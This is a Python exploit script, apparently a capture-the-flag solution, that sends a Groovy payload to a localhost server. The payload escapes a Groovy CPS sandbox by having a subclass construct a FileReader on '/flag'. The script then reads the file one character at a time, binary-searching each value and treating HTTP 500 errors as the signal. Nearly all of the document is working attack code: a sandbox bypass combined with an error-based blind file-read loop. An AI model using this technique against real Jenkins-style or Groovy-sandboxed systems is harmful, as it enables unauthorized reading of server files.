from time import sleep

import requests

url = 'http://localhost/'
exp = '''
package com.cloudbees.groovy.cps
class SerializableScript {
  def x
  def y
  SerializableScript(FileReader f,Throwable t) { this.x = f;this.y=t }
}
class Subclass extends SerializableScript {
  Subclass() { super(['/flag'],['114514']) }
}
def e=new Subclass().x
e.skip([SKIP])
def c=e.read()
if(c>[TARGET]){
  throw new Subclass().y
}
'''


def getexp(pos, target):
    return exp.replace('[SKIP]', str(pos)).replace('[TARGET]', str(target))


def divide(start, to):
    # (start,to]
    return start+int((to-start)/2)


def check(pos, target):
    print('  [+]', pos, target)
    r = requests.get(url, data=getexp(pos, target))
    if r.status_code == 500:
        return True
    return False


flag = ''
for pos in range(32):
    print('[+]', pos)
    start = 31  # (
    end = 65535  # ]

    # check >128?
    if check(pos, 128):
        start = 128
    else:
        end = 128

    while end - start != 1:
        p = divide(start, end)
        # check >p?
        # sleep(1)
        if check(pos, p):
            start = p
        else:
            end = p
    flag += chr(end)
    print(chr(end), flag)
    # sleep(3)
